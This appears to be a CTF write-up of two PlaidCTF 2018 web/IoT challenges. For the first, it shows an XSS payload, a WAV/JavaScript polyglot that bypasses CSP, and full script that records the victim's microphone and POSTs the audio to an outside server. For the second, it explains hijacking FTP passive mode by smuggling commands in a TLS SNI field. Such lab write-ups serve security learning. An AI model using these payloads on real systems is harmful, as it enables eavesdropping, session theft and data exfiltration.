# PlaidCTF 2018


**It's recommended to read our responsive [web version](https://balsn.github.io/ctf_writeup/20180505-plaidctf/) of this writeup.**


 - [PlaidCTF 2018](#plaidctf-2018)
   - [web](#web)
     - [idIoT: Action (bookgin)](#idiot-action-bookgin)
     - [idIoT: Camera (unsolved, written by bookgin)](#idiot-camera-unsolved-written-by-bookgin)



## web

### idIoT: Action (bookgin)

After login, we can post a clip of audio with title and description. The description filed is vulnerable to XSS. We insert `<marquee>xss</marquee>` in to the description and find it works!

However, let's take a look at Content Security Policy:

```
style-src 'self' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com;
media-src 'self' blob:;
script-src 'self';
object-src 'self';
frame-src 'self'
```

Note that `image-src` is not defined. We can insert `<img src="evil_website">` to check if the headless robot is browsing this clip.

It's impossible to XSS directly in the description because `script-src self` will block the inline javascript. However, if we can upload a javascript, we can use `<script src="...">` to execute the payload! But how?

The website allows the user to upload an audio clip, with file extension ogg/wav/wave/webm/mp3. The server site seems to validate the audio header. A plain text file cannot be uploaded. 

This is easy to bypass. We simply manipulate the WAV format and comment out the header field. Then, insert the javascript payload after the header.

```
00000000: 5249 4646 3d31 2f2a 5741 5645 666d 7420  RIFF=1/*WAVEfmt
00000010: 1000 0000 0100 0100 c05d 0000 80bb 0000  .........]......
00000020: 0200 1000 4c49 5354 1a00 0000 494e 464f  ....LIST....INFO
00000030: 4953 4654 0e00 0000 4c61 7666 3537 2e38  ISFT....Lavf57.8
00000040: 332e 3130 3000 6461 7461 80d8 0100 0000  3.100.data......
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 ffff 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000c0: 0000 0000 0000 0000 2a2f 0a3b 616c 6572  ........*/.;aler
000000d0: 7428 3129 3b0a                           t(1);.
```

After uploading this evil wav, we are trying to XSS with `<script src="uploads/filename.wav"></script>` but it didn't work. The reason is the Apache server will return the content-type `audio/wave`. The browser will check the type. If the type is `audio`, the broser will not include the file for security reason.

That's annoying. After trying all the extension `ogg/wav/wave/webm/mp3`, we found Apache doesn't recognize `*.wave` as a audio file. Therefore, if we upload a file named `filename.wave`, and then include the script through `<script src="filename.wave"></script>`, the javascript can be exeuted!

After XSS, we can steal the admin's cookie and login as admin. There are two clips in the account. The first is intended to give the challenges the correct command to Google Home, "OK Google, what is the flag?" The second clip is telling us that the admin will only stay on the clips interested him. "Has anyone else played "Toaster Wars"? Share me clips with 'spatulate' in the description and I'll give them a listen!". So we just put "spatulate' in the description.

The attack steps are listed below:

1. The admin clicks the clip which we shared.
2. The audio of that clip, "Ok google, what is the flag?", will be played automatically.
3. The description contains a malicious Javascript `<script src="js.wave"></script>`, and the admin will execute it.
4. The js will automatically start recording what the Google home said.
5. After recording for 8 seconds, it will stop recording and POST the audio to our website.

The javascript is here. I use a lot of `setTimeout()` to trace the admin's behavior.

```js
// Fake WAVE header
window.onload = () => {
    let errorElt = document.getElementById("error");
    let recordButton = document.getElementById("audio-record");
    let recordPlayback = document.getElementById("record-playback");
    let uploadForm = document.getElementById("upload-form");
    let mediaRecorder;
    let mediaType =
        !("MediaRecorder" in window) ? undefined
        : MediaRecorder.isTypeSupported("audio/webm") ? "audio/webm"
        : MediaRecorder.isTypeSupported("audio/ogg") ? "audio/ogg"
        : undefined;
    let mediaBlob;

    if (!mediaType) {
        recordButton.disabled = true;
        recordButton.innerText = "Not supported";
    }

    let err = /err=([^&]*)/.exec(window.location.search);
    if (errorElt && err) {
        errorElt.className = "";
        errorElt.innerText = decodeURIComponent(err[1].replace(/\+/g, " "));
    }

    if (recordButton) {
        recordButton.addEventListener("click", (e) => {
            e.preventDefault();
            if (!mediaType) {
                return;
            }
            if (mediaRecorder) {
                mediaRecorder.stop();
                mediaRecorder = undefined;
                recordButton.innerText = "Record";
            } else {
                recordButton.innerText = "Stop";
                navigator.mediaDevices.getUserMedia({ audio: true })
                    .then((stream) => {
                        mediaRecorder = new MediaRecorder(stream, { mimeType: mediaType });
                        mediaRecorder.start();

                        let chunks = [];

                        mediaRecorder.addEventListener("dataavailable", (e) => {
                            chunks.push(e.data);
                        });

                        mediaRecorder.addEventListener("stop", () => {
                            mediaBlob = new Blob(chunks);
                            recordPlayback.src = URL.createObjectURL(mediaBlob);
                        })
                    });
            }
        });
    }

    if (uploadForm) {
        uploadForm.addEventListener("submit", (e) => {
            e.preventDefault();
            let formData = new FormData(document.getElementById("upload-form"));
            if (mediaBlob) {
                formData.append("audiofile", mediaBlob, "audio." + mediaType.split("/")[1]);
            }


        });
    }
    setTimeout(function(){
        fetch("https://example.com.tw/?0");
    }, 0);
    setTimeout(function(){
        fetch("https://example.com.tw/?5000");
    }, 5000);
    setTimeout(function(){
        fetch("https://example.com.tw/?10000");
    }, 10000);
    setTimeout(function(){
        fetch("https://example.com.tw/?15000");
    }, 15000);
    setTimeout(function(){
        fetch("https://example.com.tw/?20000");
    }, 20000);
    setTimeout(function(){ // after 1000 ms, start recording
        recordButton.click();
        fetch("https://example.com.tw/?startrecording");
        setTimeout(function() { // recording for 7000 ms
            recordButton.click();
            fetch("https://example.com.tw/?endrecording");

            // lets submit to my evil server
            setTimeout(function() { // process time: 2000ms
                let formData = new FormData(uploadForm);
                if (mediaBlob) {
                    formData.append("audiofile", mediaBlob, "audio." + mediaType.split("/")[1]);
                }
                let postf = fetch("https://example.com.tw/log", {
                    method: "POST",
                    body: formData,
                });
            }, 5000);
        }, 15000);
    }, 1000);

}
```

The description:

```html
Has anyone else played "Toaster Wars"? Share me clips with "spatulate" in the description and I'll give them a listen!
Spatulate
<img src="https://example.com.tw/?xsssuccess"></img>
<form action="create.php" method="post" enctype="multipart/form-data" id="upload-form">
        <div class="box">
            <label class="title">Title</label>
            <input type="text" name="title" id="title-input" placeholder="Enter a title" value="a"/>
        </div>
        <div class="box">
            <label class="title">Description</label>
            <textarea type="text" name="description" id="description-input" placeholder="Enter a description" value="b"></textarea>
        </div>
        <div class="box">
            <label class="title">Clip</label>
            <div class="options">
                <div id="upload-option">
                    <h3>Upload a File</h3>
                    <h4>You can upload .wav/wave, .mp3, .ogg, .webm</h4>
                    <label for="audiofile" class="file-label">Upload a file</label>
                    <input type="file" name="audiofile" id="audiofile" accept="audio/*" />
                </div>
                <div class="or"></div>
                <div id="record-option">
                    <h3>Record a Clip</h3>
                    <h4>Recent Chrome or Firefox only</h4>
                    <button type="button" id="audio-record">Record</button>
                    <audio id="record-playback" controls></audio>
                </div>
            </div>
        </div>
        <input type="submit" name="submit" value="submit" />
    </form>
<script src="[uploaded_js_url]"></script>
```

and listen carefully, "the flag is PCTF open bracket not underscore so underscore smart close bracket."

We got the flag:`PCTF{not_so_smart}`.

This is a very interesting and great challenge:) 
You can check out the author's setup album [here](https://imgur.com/a/lrIQto5).

### idIoT: Camera (unsolved, written by bookgin)

Thanks to @bluepichu and @kunte_ for this solution.

The challenge includes a binary of the customized FTP server. After digging into the commands, @sasdf found this ftp server allows a "IP" command, which is used to specify the server IP. Also, "PASV" command exists. It looks like we can attack the FTP passive mode by sppcify our IP address. Because when sending `PASV` command, the server will tell which (IP, port) the user should connect. The IP can be controlled by the `IP` command.

The attack steps are listed below:

1. The Wifi camera login to the FTP server: `USER username`, `PASS password`
2. We quickly create another connection and send `IP 240.1.2.3`.
3. Next, the Wifi camera will send `PASV` command, but the IP has be changed!
4. The FTP server will reply `227 Entering passive mode (240,1,2,3,86,206)`, whihc is our specific IP.
5. Thus, the Wifi camera will start to send the image to our server.

Okay, but how do we send `IP 240.1.2.3`? Remember in the idIoT: Action, we have the XSS attack vector. We can smuggle the FTP protocol thorugh HTTP request. However, there is a WAF in the FTP server:

```cpp
if ( v65 > 2 && !strncasecmp(s1, "GET", 3uLL)
    || v65 > 3 && !strncasecmp(s1, "HEAD", 4uLL)
    || v65 > 3 && !strncasecmp(s1, "POST", 4uLL)
    || v65 > 2 && !strncasecmp(s1, "PUT", 3uLL)
    || v65 > 5 && !strncasecmp(s1, "DELETE", 6uLL)
    || v65 > 6 && !strncasecmp(s1, "CONNECT", 7uLL)
    || v65 > 6 && !strncasecmp(s1, "OPTIONS", 7uLL)
    || v65 > 4 && !strncasecmp(s1, "TRACE", 5uLL)
    || v65 > 4 && !strncasecmp(s1, "PATCH", 5uLL) )
```

and we stuck here until the comppetition ends because we are not able to come out of a way to bypass the WAF and smuggle the protocl.

The HTTP request does't work. How about FTP request? Although Chorme support FTP, it cannot be used to send our customized command `IP 240.1.2.3`. Inserting CRLF in `ftp://username:password@hostname/`  doesn't work at all. Of course, there is no gopher/dict protocol implementation in Chrome.

but how about the HTTPS protocol?

Although the first TLS handshake message Client Hello is encrypted, not all of the payload are garbled, encryted text. The SNI (server name indication) is left in plaintext. Let's leverage SNI to smuggle the FTP protocol. 

Suppose the URL is:

`https://p8.8.8.8.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaa.127.0.0.1.xip.io:1212`

Of course, the DNS record will resolve to 127.0.0.1. ([xip.io](http://xip.io/) is a handy website when you're too lazy to build up a DNS server yourself.)

The raw client hello will be like: 
```
...
0040   c0 14 00 33 00 39 00 2f 00 35 00 0a 01 00 01 b5  ...3.9./.5......
0050   00 00 00 6e 00 6c 00 00 69 70 38 2e 38 2e 38 2e  ...n.l..ip8.8.8.
0060   38 2e 61 61 61 61 61 61 61 61 61 61 61 61 61 61  8.aaaaaaaaaaaaaa
0070   61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
0080   61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
0090   61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00a0   61 2e 61 61 61 61 61 61 61 61 61 61 61 61 61 61  a.aaaaaaaaaaaaaa
00b0   61 2e 31 32 37 2e 30 2e 30 2e 31 2e 78 69 70 2e  a.127.0.0.1.xip.
00c0   69 6f 00 17 00 00 ff 01 00 01 00 00 0a 00 0a 00  io..............
00d0   08 00 1d 00 17 00 18 00 19 00 0b 00 02 01 00 00  ................
00e0   23 00 00 00 10 00 0e 00 0c 02 68 32 08 68 74 74  #.........h2.htt
00f0   70 2f 31 2e 31 00 05 00 05 01 00 00 00 00 00 0d  p/1.1...........
...
```

1. The SNI length is 0x69, which is ASCII `i`.
2. The data type of SNI length is a 2-byte integer, so it will become 0x00 0x69.
3. The FTP server ignores all the invalid command.
4. Both newline and null byte 0x00 can be used to spicify the end of a command in the FTP server.
5. Because we don't know the port, one might use iptables to listen on a number of ports.

We didn't come out of this exploitation. Full credit for @kunte_. His/Her explanation is [here](https://files.veryhax.ninja/writeup_idiot_camera.txt). Many thanks to him/her! **Note that I didn't check if the payload works or not**.

Acctually, the protcol smuggling technique is referred in the [2017 Blackhat by orange](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf). It's really a shame that I didn't think of exploiting SNI, because my research about DDoS mitigation utilizes SNI in the implmentation.

By the way, it's cool challenge! That's a very intriguing way to smuggle the protocol. You can check out the author's setup album [here](https://imgur.com/a/lrIQto5).
